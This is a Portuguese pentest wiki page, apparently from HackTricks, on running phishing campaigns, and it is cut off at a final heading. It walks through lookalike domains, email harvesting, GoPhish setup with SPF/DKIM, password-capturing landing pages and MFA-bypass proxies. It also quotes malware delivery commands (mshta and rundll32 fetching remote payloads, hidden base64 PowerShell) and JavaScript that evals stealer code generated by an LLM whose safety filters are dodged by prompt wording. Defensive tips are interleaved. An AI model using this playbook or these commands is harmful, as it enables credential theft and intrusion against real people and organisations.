# Metodologia de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Faça o reconhecimento da vítima
   1. Selecione o **domínio da vítima**.
   2. Faça uma enumeração web básica, **buscando portais de login** usados pela vítima, e **decida** qual você vai **imitar**.
   3. Use **OSINT** para **encontrar emails**.
2. Prepare o ambiente
   1. **Compre o domínio** que você vai usar na avaliação de phishing
   2. **Configure os registros** relacionados ao serviço de email (SPF, DMARC, DKIM, rDNS)
   3. Configure o VPS com **gophish**
3. Prepare a campanha
   1. Prepare o **template de email**
   2. Prepare a **página web** para roubar as credenciais
4. Lance a campanha!

## Gere nomes de domínio semelhantes ou compre um domínio confiável

### Técnicas de variação de nomes de domínio

- **Keyword**: O nome de domínio **contém** uma **palavra-chave** importante do domínio original (por exemplo, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Troque o **ponto por um hífen** em um subdomínio (por exemplo, www-zelster.com).
- **New TLD**: Mesmo domínio usando um **novo TLD** (por exemplo, zelster.org)
- **Homoglyph**: **Substitui** uma letra no nome de domínio por **letras visualmente semelhantes** (por exemplo, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Troca duas letras** no nome de domínio (por exemplo, zelsetr.com).
- **Singularization/Pluralization**: Adiciona ou remove “s” no final do nome de domínio (por exemplo, zeltsers.com).
- **Omission**: **Remove uma** das letras do nome de domínio (por exemplo, zelser.com).
- **Repetition:** **Repete uma** das letras no nome de domínio (por exemplo, zeltsser.com).
- **Replacement**: Como Homoglyph, mas menos discreto. Substitui uma das letras do nome de domínio, talvez por uma letra próxima da original no teclado (por exemplo, zektser.com).
- **Subdomained**: Introduz um **ponto** dentro do nome de domínio (por exemplo, ze.lster.com).
- **Insertion**: **Insere uma letra** no nome de domínio (por exemplo, zerltser.com).
- **Missing dot**: Acrescenta o TLD ao nome de domínio (por exemplo, zelstercom.com).

**Ferramentas automáticas**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Sites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Existe a **possibilidade de alguns bits armazenados ou em comunicação serem invertidos automaticamente** devido a vários fatores, como erupções solares, raios cósmicos ou erros de hardware.

Quando esse conceito é **aplicado a solicitações DNS**, é possível que o **domínio recebido pelo servidor DNS** não seja o mesmo domínio solicitado inicialmente.

Por exemplo, uma alteração de um único bit no domínio "windows.com" pode transformá-lo em "windnws.com."

Os atacantes podem **se aproveitar disso registrando vários domínios com bitflipping** semelhantes ao domínio da vítima. A intenção é redirecionar usuários legítimos para sua própria infraestrutura.

Para mais informações, leia [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Compre um domínio confiável

Você pode pesquisar em [https://www.expireddomains.net/](https://www.expireddomains.net) um domínio expirado que possa usar.\
Para ter certeza de que o domínio expirado que você pretende comprar **já tem um bom SEO**, você pode verificar como ele está categorizado em:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Descobrindo emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Para **descobrir mais** endereços de email válidos ou **verificar os que** você já descobriu, você pode conferir se consegue fazer brute force nos servidores SMTP da vítima. [Saiba aqui como verificar/descobrir endereços de email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Além disso, não se esqueça de que, se os usuários usarem **algum portal web para acessar seus emails**, você pode verificar se ele é vulnerável a **brute force de username** e explorar a vulnerabilidade, se possível.

## Configurando o GoPhish

### Instalação

Você pode baixá-lo em [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Baixe e descompacte-o em `/opt/gophish` e execute `/opt/gophish/gophish`\
A senha do usuário admin na porta 3333 será exibida na saída. Portanto, acesse essa porta e use essas credenciais para alterar a senha de admin. Talvez seja necessário criar um túnel para essa porta até a máquina local:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Configuração

**Configuração do certificado TLS**

Antes desta etapa, você já deve ter **comprado o domínio** que vai usar, e ele deve estar **apontando** para o **IP do VPS** onde você está configurando o **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Configuração de e-mail**

Comece instalando: `apt-get install postfix`

Em seguida, adicione o domínio aos seguintes arquivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Altere também os valores das seguintes variáveis em /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Por fim, modifique os arquivos **`/etc/hostname`** e **`/etc/mailname`** para usar o nome do seu domínio e **reinicie seu VPS.**

Agora, crie um **registro DNS A** de `mail.<domain>` apontando para o **endereço IP** do VPS e um **registro DNS MX** apontando para `mail.<domain>`

Agora vamos testar o envio de um e-mail:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Configuração do Gophish**

Pare a execução do Gophish e vamos configurá-lo.\
Modifique `/opt/gophish/config.json` para o seguinte (observe o uso de https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Configurar o serviço gophish**

Para criar o serviço gophish para que ele possa ser iniciado automaticamente e gerenciado como um serviço, você pode criar o arquivo `/etc/init.d/gophish` com o seguinte conteúdo:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Conclua a configuração do serviço e verifique-o da seguinte forma:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Configurando o servidor de e-mail e o domínio

### Aguarde e seja legítimo

Quanto mais antigo for um domínio, menor a probabilidade de ele ser detectado como spam. Portanto, você deve aguardar o máximo de tempo possível (pelo menos 1 semana) antes da avaliação de phishing. Além disso, se você colocar uma página sobre um setor de boa reputação, a reputação obtida será melhor.

Observe que, mesmo que você tenha que esperar uma semana, pode terminar de configurar tudo agora.

### Configure o registro Reverse DNS (rDNS)

Defina um registro rDNS (PTR) que resolva o endereço IP do VPS para o nome de domínio.

### Registro Sender Policy Framework (SPF)

Você deve **configurar um registro SPF para o novo domínio**. Se não sabe o que é um registro SPF, [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Você pode usar [https://www.spfwizard.net/](https://www.spfwizard.net) para gerar sua política SPF (use o IP da máquina VPS).

![Formulário do SPF Wizard para gerar um registro SPF para um domínio de phishing](<../../images/image (1037).png>)

Este é o conteúdo que deve ser definido em um registro TXT no domínio:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Registro Domain-based Message Authentication, Reporting & Conformance (DMARC)

Você deve **configurar um registro DMARC para o novo domínio**. Se não sabe o que é um registro DMARC, [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Você precisa criar um novo registro DNS TXT apontando o hostname `_dmarc.<domain>` com o seguinte conteúdo:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Você precisa **configurar um DKIM para o novo domínio**. Se não souber o que é um registro DKIM, [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Este tutorial é baseado em: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Você precisa concatenar os dois valores B64 gerados pela chave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Teste a pontuação da configuração do seu e-mail

Você pode fazer isso usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Basta acessar a página e enviar um e-mail para o endereço fornecido:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Você também pode **verificar a configuração do seu email** enviando um email para `check-auth@verifier.port25.com` e **lendo a resposta** (para isso, você precisará **abrir** a porta **25** e verificar a resposta no arquivo _/var/mail/root_ se enviar o email como root).\
Verifique se você passou em todos os testes:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Você também pode enviar uma **mensagem para uma conta do Gmail sob seu controle** e verificar os **cabeçalhos do e-mail** na sua caixa de entrada do Gmail. `dkim=pass` deve estar presente no campo do cabeçalho `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Removendo da lista de bloqueio do Spamhouse

A página [www.mail-tester.com](https://www.mail-tester.com) pode indicar se o seu domínio está sendo bloqueado pelo Spamhouse. Você pode solicitar a remoção do seu domínio/IP em: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removendo da lista de bloqueio da Microsoft

​​Você pode solicitar a remoção do seu domínio/IP em [https://sender.office.com/](https://sender.office.com).

## Criar e lançar uma campanha do GoPhish

### Perfil de envio

- Defina um **nome para identificar** o perfil de envio
- Decida de qual conta você enviará os emails de phishing. Sugestões: _noreply, support, servicedesk, salesforce..._
- Você pode deixar o nome de usuário e a senha em branco, mas certifique-se de marcar Ignore Certificate Errors

![Criar e lançar uma campanha do GoPhish - Perfil de envio: Você pode deixar o nome de usuário e a senha em branco, mas certifique-se de marcar Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> É recomendável usar a funcionalidade "**Send Test Email**" para testar se tudo está funcionando.\
> Recomendo **enviar os emails de teste para endereços de email temporários de 10min** para evitar entrar em listas de bloqueio durante os testes.

### Template de email

- Defina um **nome para identificar** o template
- Em seguida, escreva um **assunto** (nada estranho, apenas algo que você esperaria ler em um email comum)
- Certifique-se de marcar "**Add Tracking Image**"
- Escreva o **template do email** (você pode usar variáveis, como no exemplo a seguir):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Observe que **para aumentar a credibilidade do e-mail**, recomenda-se usar alguma assinatura de um e-mail do cliente. Sugestões:

- Envie um e-mail para um **endereço inexistente** e verifique se a resposta tem alguma assinatura.
- Pesquise **e-mails públicos**, como info@ex.com, press@ex.com ou public@ex.com, envie um e-mail e aguarde a resposta.
- Tente entrar em contato com algum e-mail válido que tenha sido **descoberto** e aguarde a resposta.

![Perfil de envio - Modelo de e-mail: tente entrar em contato com algum e-mail válido que tenha sido descoberto e aguarde a resposta](<../../images/image (80).png>)

> [!TIP]
> O modelo de e-mail também permite **anexar arquivos para envio**. Se também quiser roubar desafios NTLM usando arquivos/documentos especialmente criados, [leia esta página](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Página de destino

- Defina um **nome**
- **Escreva o código HTML** da página da web. Observe que você pode **importar** páginas da web.
- Marque **Capture Submitted Data** e **Capture Passwords**
- Defina um **redirecionamento**

![Modelo de e-mail - Página de destino: marque Capture Submitted Data e Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalmente, será necessário modificar o código HTML da página e fazer alguns testes localmente (talvez usando um servidor Apache) **até gostar do resultado.** Depois, escreva esse código HTML na caixa.\
> Observe que, se precisar **usar recursos estáticos** no HTML (talvez algumas páginas CSS e JS), você pode salvá-los em _**/opt/gophish/static/endpoint**_ e acessá-los em _**/static/\<filename>**_

> [!TIP]
> Para o redirecionamento, você pode **redirecionar os usuários para a página principal legítima da vítima** ou redirecioná-los, por exemplo, para _/static/migration.html_, exibir uma **roda giratória (**[**https://loading.io/**](https://loading.io)**) por 5 segundos e, em seguida, indicar que o processo foi concluído com sucesso**.

### Usuários e grupos

- Defina um nome
- **Importe os dados** (observe que, para usar o modelo do exemplo, você precisa do nome, sobrenome e endereço de e-mail de cada usuário)

![Página de destino - Usuários e grupos: importe os dados (observe que, para usar o modelo do exemplo, você precisa do nome, sobrenome e endereço de e-mail de cada usuário)](<../../images/image (163).png>)

### Campanha

Por fim, crie uma campanha selecionando um nome, o modelo de e-mail, a página de destino, a URL, o perfil de envio e o grupo. Observe que a URL será o link enviado às vítimas.

Observe que o **perfil de envio permite enviar um e-mail de teste para ver como será o e-mail de phishing final**:

![Usuários e grupos - Campanha: observe que o perfil de envio permite enviar um e-mail de teste para ver como será o e-mail de phishing final](<../../images/image (192).png>)

Quando tudo estiver pronto, basta iniciar a campanha!

## Clonagem de sites

Se, por algum motivo, quiser clonar o site, consulte a seguinte página:


{{#ref}}
clone-a-website.md
{{#endref}}

## Documentos e arquivos com backdoor

Em algumas avaliações de phishing (principalmente para Red Teams), você também pode querer **enviar arquivos que contenham algum tipo de backdoor** (talvez um C2 ou simplesmente algo que acione uma autenticação).\
Consulte a seguinte página para ver alguns exemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing de MFA

### Via proxy MitM

O ataque anterior é bastante inteligente, pois você está falsificando um site real e coletando as informações inseridas pelo usuário. Infelizmente, se o usuário não inserir a senha correta ou se o aplicativo falsificado estiver configurado com 2FA, **essas informações não permitirão que você se passe pelo usuário enganado**.

É aqui que ferramentas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) são úteis. Essas ferramentas permitem gerar um ataque semelhante a um MitM. Basicamente, os ataques funcionam da seguinte forma:

1. Você **falsifica o formulário de login** da página real.
2. O usuário **envia** suas **credenciais** para a página falsa, e a ferramenta as envia para a página real, **verificando se as credenciais funcionam**.
3. Se a conta estiver configurada com **2FA**, a página MitM solicitará o código e, assim que o **usuário o inserir**, a ferramenta o enviará para a página real.
4. Após a autenticação do usuário, você, como atacante, terá **capturado as credenciais, o 2FA, o cookie e quaisquer informações de cada interação realizada enquanto a ferramenta executa um MitM**.

### Via VNC

E se, em vez de **enviar a vítima para uma página maliciosa** com a mesma aparência da original, você a enviasse para uma **sessão VNC com um navegador conectado à página real**? Você poderá ver o que ela faz, roubar a senha, o MFA usado, os cookies...\
Você pode fazer isso com [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detectando a detecção

Obviamente, uma das melhores maneiras de saber se você foi descoberto é **pesquisar seu domínio em listas de bloqueio**. Se ele aparecer listado, de alguma forma seu domínio foi identificado como suspeito.\
Uma maneira simples de verificar se seu domínio aparece em alguma lista de bloqueio é usar [https://malwareworld.com/](https://malwareworld.com)

No entanto, existem outras maneiras de saber se a vítima está **procurando ativamente atividades suspeitas de phishing na internet**, conforme explicado em:


{{#ref}}
detecting-phising.md
{{#endref}}

Você pode **comprar um domínio com um nome muito parecido** com o domínio da vítima **e/ou gerar um certificado** para um **subdomínio** de um domínio controlado por você **que contenha** a **palavra-chave** do domínio da vítima. Se a **vítima** realizar algum tipo de **interação DNS ou HTTP** com eles, você saberá que **ela está procurando domínios suspeitos ativamente** e precisará agir com muita discrição.<sup>[[2]](#references)</sup>

### Avaliar o phishing

Use [**Phishious** ](https://github.com/Rices/Phishious)para avaliar se seu e-mail vai parar na pasta de spam, se será bloqueado ou se será bem-sucedido.

## Comprometimento de identidade com interação direta (redefinição de MFA pelo suporte técnico)

Grupos de intrusão modernos estão cada vez mais ignorando completamente as iscas por e-mail e **atacando diretamente o fluxo de trabalho do suporte técnico/recuperação de identidade** para contornar o MFA. O ataque é totalmente "living-off-the-land": assim que o operador obtém credenciais válidas, ele avança usando ferramentas administrativas integradas — não é necessário malware.<sup>[[6]](#references)</sup>

### Fluxo do ataque
1. Faça reconhecimento da vítima 
   * Colete dados pessoais e corporativos no LinkedIn, em violações de dados, no GitHub público etc.  
   * Identifique identidades de alto valor (executivos, TI, finanças) e enumere o **processo exato do suporte técnico** para redefinição de senha/MFA.
2. Engenharia social em tempo real  
   * Ligue, envie mensagens pelo Teams ou converse com o suporte técnico, passando-se pelo alvo (geralmente usando **identificação de chamadas falsificada** ou **voz clonada**).  
   * Forneça as informações pessoais identificáveis coletadas anteriormente para passar pela verificação baseada em conhecimento.  
   * Convença o agente a **redefinir o segredo do MFA** ou a fazer uma **troca de SIM** no número de celular registrado.
3. Ações imediatas após o acesso (≤60 min em casos reais)  
   * Estabeleça uma posição inicial por meio de qualquer portal web SSO.  
   * Faça a enumeração do AD/AzureAD usando ferramentas integradas (sem soltar binários):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateral movement com **WMI**, **PsExec** ou agentes **RMM** legítimos já permitidos no ambiente.

### Detecção e Mitigação
* Trate a recuperação de identidade pelo help-desk como uma **operação privilegiada** – exija autenticação reforçada e aprovação do gerente.
* Implante regras de **Identity Threat Detection & Response (ITDR)** / **UEBA** que gerem alertas para:  
  * Método de MFA alterado + autenticação de um novo dispositivo / localização geográfica.  
  * Elevação imediata do mesmo principal (usuário-→-admin).  
* Grave as chamadas do help-desk e exija uma **ligação de retorno para um número já registrado** antes de qualquer redefinição.
* Implemente **Just-In-Time (JIT) / Privileged Access** para que contas recém-redefinidas **não herdem automaticamente tokens de alto privilégio**.

---

## Decepção em larga escala – Envenenamento de SEO e campanhas “ClickFix”
Grupos criminosos comuns compensam o custo de operações direcionadas com ataques em massa que transformam **mecanismos de busca e redes de anúncios no canal de distribuição**.<sup>[[6]](#references)</sup>

1. **Envenenamento de SEO / malvertising** coloca um resultado falso, como `chromium-update[.]site`, no topo dos anúncios de busca.
2. A vítima baixa um pequeno **loader de primeiro estágio** (geralmente JS/HTA/ISO). Exemplos observados pela Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. O loader exfiltra cookies do navegador e bancos de dados de credenciais, depois baixa um **loader silencioso** que decide – *em tempo real* – se deve implantar:
   * RAT (por exemplo, AsyncRAT, RustDesk)
   * ransomware / wiper
   * componente de persistência (chave Run do registro + tarefa agendada)

### Dicas de hardening
* Bloqueie domínios recém-registrados e aplique **Advanced DNS / URL Filtering** tanto em *anúncios de busca* quanto em e-mails.
* Restrinja a instalação de software a pacotes MSI assinados / da Store; negue a execução de `HTA`, `ISO`, `VBS` por política.
* Monitore processos filhos de navegadores abrindo instaladores:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Procure LOLBins frequentemente abusados por first-stage loaders (por exemplo, `regsvr32`, `curl`, `mshta`).

### Sequestro do clique no botão de download com redirecionamento para um TDS
Alguns portais falsos de software mantêm o `href` visível do download apontando para a URL **real** do GitHub/release, mas sequestram a **primeira** interação do usuário em JavaScript e enviam a vítima para uma cadeia de **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Principais características:
- O hook geralmente é executado na **fase de captura** (`true`) em `document`, portanto é acionado antes dos handlers do site.
- O Chrome costuma usar `mousedown` em vez de `click` para manter o redirecionamento vinculado a um **gesto do usuário** válido e melhorar o bypass de bloqueadores de pop-ups.
- Algumas variantes pré-abrem `about:blank` ou sintetizam cliques em `<a target="_blank">` e só depois atribuem a URL do TDS.
- Os limites do lado do navegador costumam ficar em `localStorage`, então o **primeiro clique** pode levar ao malware, enquanto atualizações/tentativas posteriores retornam ao link visível, que parece legítimo.
- O TDS pode filtrar por referrer, domínio de entrada, GEO, fingerprint do navegador/dispositivo, verificações de VPN/datacenter, contexto do clique e contadores por sessão, tornando as reproduções por analistas não determinísticas.

Ideias para defensores:
- Compare o `href` **exibido** com o destino de navegação **real** gerado no momento do clique.
- Procure handlers `document.addEventListener(..., true)` que chamem `preventDefault()` e `stopImmediatePropagation()` em conjunto com `window.open`, `about:blank` ou cliques em âncoras sintetizados.
- Trate grupos de domínios de download de software recém-registrados que carregam o mesmo estágio CloudFront/JS como um padrão altamente indicativo de SEO poisoning/TDS.

### ClickFix em páginas falsas de verificação + buscas LOLBAS com aparência de arquivo compactado
Algumas ramificações do TDS terminam em uma página falsa de verificação (no estilo Cloudflare/IUAM) que instrui a vítima a executar um binário confiável do Windows, como:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notas:
- `mshta.exe` executa o **HTA/VBScript no início da resposta**, mesmo que a URL finja ser um arquivo `.7z`; os dados de arquivo anexados podem ser apenas uma isca.
- As etapas seguintes costumam continuar mentindo sobre o tipo de arquivo (`.rtf` para PowerShell, `.asar` para Python, ZIPs com binários preenchidos com dados) e depois passar para **mapeamento manual de PE / execução em memória**.
- Se você estiver respondendo a uma dessas cadeias, preserve **a rede e a memória desde a primeira execução bem-sucedida**: replays posteriores podem mostrar apenas um caminho benigno de instalador/SFX ou falhar porque a liberação do payload/chave estava vinculada à sessão TDS original.

### Técnicas de entrega de DLL do ClickFix (falsa atualização do CERT)
* Isca: aviso clonado de um CERT nacional com um botão **Update** que exibe instruções passo a passo de “correção”. As vítimas são instruídas a executar um batch que baixa uma DLL e a executa via `rundll32`.<sup>[[12]](#references)</sup>
* Cadeia batch típica observada:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` grava o payload em `%TEMP%`, uma breve pausa disfarça a variação da latência da rede e, em seguida, `rundll32` chama o ponto de entrada exportado (`notepad`).
* A DLL envia sinais com a identidade do host e consulta o C2 a cada poucos minutos. As instruções remotas chegam como **PowerShell codificado em base64**, executado em modo oculto e com desvio da política de execução:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Isso preserva a flexibilidade do C2 (o servidor pode trocar as tarefas sem atualizar a DLL) e oculta janelas do console. Procure processos filhos do PowerShell de `rundll32.exe` que usem juntos `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Os defensores podem procurar callbacks HTTP(S) no formato `...page.php?tynor=<COMPUTER>sss<USER>` e intervalos de polling de 5 minutos após o carregamento da DLL.

---

## Malvertising acionado por exibição via RTB

Ao contrário de um resultado de pesquisa patrocinado, que exige um clique, um anúncio RTB pode carregar JavaScript de terceiros quando sua peça criativa é exibida em um site ou aplicativo. O Citizen Lab observou tags de anúncios chamando um servidor de decisão separado com identificadores de publicidade. A maioria das impressões recebeu uma resposta vazia; impressões selecionadas podiam receber JavaScript. Portanto, uma resposta benigna durante a reprodução não prova que todos os espectadores receberam o mesmo conteúdo.<sup>[[14]](#references)</sup>

Esse é um **mecanismo de entrega**, não um exploit por si só: executar JavaScript em um contexto de exibição de anúncios não instala spyware automaticamente. O exploit subjacente de navegador ou SO não foi divulgado; portanto, uma impressão de anúncio ou solicitação ao servidor de decisão, por si só, não prova uma infecção. Para saber mais sobre a vinculação de identificadores no direcionamento por RTB, consulte [Modelagem de Ameaças e Separação de Identidade](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## Operações de Phishing Aprimoradas por IA
Os atacantes agora combinam **APIs de LLM e clonagem de voz** para criar iscas totalmente personalizadas e interagir em tempo real.

| Camada | Exemplo de uso por um agente de ameaça |
|-------|-----------------------------|
|Automação|Gerar e enviar mais de 100 mil e-mails / SMS com texto aleatório e links de rastreamento.|
|IA generativa|Produzir e-mails *únicos* que mencionam fusões e aquisições públicas e piadas internas das redes sociais; usar voz deepfake de CEO em golpes de retorno de chamada.|
|IA agêntica|Registrar domínios de forma autônoma, coletar inteligência de fontes abertas e criar e-mails da próxima etapa quando uma vítima clica, mas não envia as credenciais.|

**Defesa:**  
• Adicione **banners dinâmicos** que destaquem mensagens enviadas por automação não confiável (por meio de anomalias de ARC/DKIM).  
• Implante **frases de desafio biométricas de voz** para solicitações telefônicas de alto risco.  
• Simule continuamente iscas geradas por IA em programas de conscientização — modelos estáticos estão obsoletos.

Veja também — abuso de navegação agêntica para phishing de credenciais:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Veja também — abuso por agentes de IA de ferramentas CLI locais e MCP (para inventário de segredos e detecção):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Montagem de JavaScript de phishing em runtime assistida por LLM (geração de código no navegador)

Os atacantes podem distribuir HTML aparentemente benigno e **gerar o stealer em runtime** solicitando JavaScript a uma **API de LLM confiável** e, em seguida, executando-o no navegador (por exemplo, com `eval` ou `<script>` dinâmico).<sup>[[8]](#references)</sup>

1. **Prompt como ofuscação:** codifique URLs de exfiltração e strings Base64 no prompt; ajuste a redação para contornar filtros de segurança e reduzir alucinações.
2. **Chamada de API no lado do cliente:** ao carregar, o JS chama um LLM público (Gemini/DeepSeek/etc.) ou um proxy CDN; apenas o prompt/chamada de API está presente no HTML estático.
3. **Montagem e execução:** concatene a resposta e execute-a (polimórfica a cada visita):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** o código gerado personaliza a isca (por exemplo, analisando tokens do LogoKit) e envia as credenciais para o endpoint oculto no prompt.

**Características de evasão**
